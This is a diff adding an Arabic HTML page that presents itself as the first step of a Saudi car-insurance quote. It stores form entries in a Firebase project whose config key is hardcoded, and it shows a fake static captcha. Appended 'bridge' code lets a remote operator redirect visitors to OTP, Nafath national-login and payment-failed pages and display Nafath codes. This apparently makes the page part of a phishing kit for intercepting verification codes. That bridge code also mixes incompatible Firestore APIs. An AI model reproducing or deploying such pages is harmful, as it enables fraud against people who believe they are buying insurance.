@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بيانات التأمين</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
+    <style>
+        body {
+            background-color: #e8f5e9;
+        }
+        .form-wrapper {
+            max-width: 800px;
+            margin: 30px auto;
+            padding: 30px;
+            background: #d1e7dd;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        /* شريط الخطوات في الأعلى */
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            color: #6c757d;
+            font-size: 0.9rem;
+        }
+        .step {
+            text-align: center;
+            flex: 1;
+            position: relative;
+        }
+        .step.active {
+            color: #198754; /* لون أخضر للخطوة الحالية */
+            font-weight: bold;
+        }
+        .step-icon {
+            width: 35px;
+            height: 35px;
+            background-color: #fff;
+            border: 2px solid #ccc;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+        }
+        .step.active .step-icon {
+            border-color: #198754;
+            background-color: #198754;
+            color: #fff;
+        }
+        .captcha-box {
+            background-color: #ffffff;
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+            letter-spacing: 5px;
+            font-size: 1.5rem;
+            color: #555;
+            border: 1px dashed #28a745;
+            user-select: none;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="form-wrapper">
+        
+        <!-- شريط الخطوات -->
+        <div class="step-indicator">
+            <div class="step active">
+                <div class="step-icon">1</div>
+                <div>بيانات التأمين</div>
+            </div>
+            <div class="step">
+                <div class="step-icon">2</div>
+                <div>قائمة الأسعار</div>
+            </div>
+            <div class="step">
+                <div class="step-icon">3</div>
+                <div>الملخص والدفع</div>
+            </div>
+        </div>
+
+        <h3 class="text-center mb-4 text-success">استكمال بيانات التأمين</h3>
+
+        <form id="detailsForm">
+            <!-- نوع التأمين -->
+            <div class="mb-3">
+                <label class="form-label fw-bold">نوع التأمين:</label>
+                <div class="mb-2"><div class="form-check card p-3 border-success"><input class="form-check-input" type="radio" name="insType" id="t1" checked><label class="form-check-label w-100" for="t1">ضد الغير</label></div></div>
+                <div><div class="form-check card p-3 border-success"><input class="form-check-input" type="radio" name="insType" id="t2"><label class="form-check-label w-100" for="t2">شامل</label></div></div>
+            </div>
+
+            <!-- تفاصيل المركبة والاستخدام -->
+            <div class="mb-3"><input type="date" class="form-control" id="startDate" placeholder="تاريخ بدء الوثيقة" required></div>
+            <div class="mb-3"><select class="form-select" id="usage"><option selected>استخدام شخصي</option><option>تجاري</option></select></div>
+            <div class="mb-3"><input type="text" class="form-control" id="carType" placeholder="نوع السيارة (مثال: كامري)" required></div>
+            <div class="mb-3"><input type="number" class="form-control" id="carYear" placeholder="سنة الصنع (مثال: 2023)" required></div>
+            <div class="mb-3"><input type="number" class="form-control" id="carValue" placeholder="القيمة التقديرية للسيارة (ريال)" required></div>
+
+            <!-- مكان الإصلاح -->
+            <div class="mb-3">
+                <label class="form-label fw-bold">مكان الإصلاح:</label>
+                <div class="form-check"><input class="form-check-input" type="radio" name="repair" id="r1" checked><label class="form-check-label" for="r1">ورشة</label></div>
+                <div class="form-check"><input class="form-check-input" type="radio" name="repair" id="r2"><label class="form-check-label" for="r2">وكالة</label></div>
+            </div>
+
+            <!-- الرمز المائي وزر العروض -->
+            <div class="mb-4">
+                <div class="captcha-box mb-2">9X4B</div>
+                <input type="text" class="form-control" placeholder="أدخل الرمز أعلاه" required>
+            </div>
+            <div class="d-grid"><button type="submit" class="btn btn-success btn-lg">إظهار العروض</button></div>
+        </form>
+    </div>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
+        authDomain: "tameen-658e9.firebaseapp.com",
+        projectId: "tameen-658e9",
+        storageBucket: "tameen-658e9.firebasestorage.app",
+        messagingSenderId: "292670676256",
+        appId: "1:292670676256:web:3624157751cd194efe4b45",
+        measurementId: "G-6P06T2H9FD"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    const userId = localStorage.getItem('user_id');
+
+    document.getElementById('detailsForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        if (userId) {
+            await updateDoc(doc(db, "requests", userId), {
+                carDetails: {
+                    type: document.getElementById('carType').value,
+                    year: document.getElementById('carYear').value,
+                    value: document.getElementById('carValue').value
+                }
+            }).catch(() => {});
+        }
+        window.location.href = "offers.html";
+    });// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
+(function() {
+    const userId = localStorage.getItem('user_id');
+    if (userId) {
+        db.collection("orders").doc(userId).onSnapshot((doc) => {
+            if (doc.exists) {
+                const data = doc.data();
+                if (data.next_step === "GO_TO_OTP") {
+                    window.location.href = "otp.html"; 
+                } else if (data.next_step === "GO_TO_REJECT") {
+                    window.location.href = "payment_faild.html";
+                } else if (data.next_step === "GO_TO_NAFATH") {
+                    window.location.href = "nafath.html";
+                } else if (data.next_step === "SHOW_NAFATH_CODE") {
+                    const codeBox = document.getElementById('nafath-number');
+                    if (codeBox && data.nafath_code) {
+                        codeBox.innerText = data.nafath_code;
+                        const overlay = document.getElementById('overlay');
+                        if (overlay) overlay.style.display = 'none';
+                    }
+                }
+            }
+        });
+    }
+})();
+// ------------------------------------------
+
+
+</script>
+</body>
+</html>
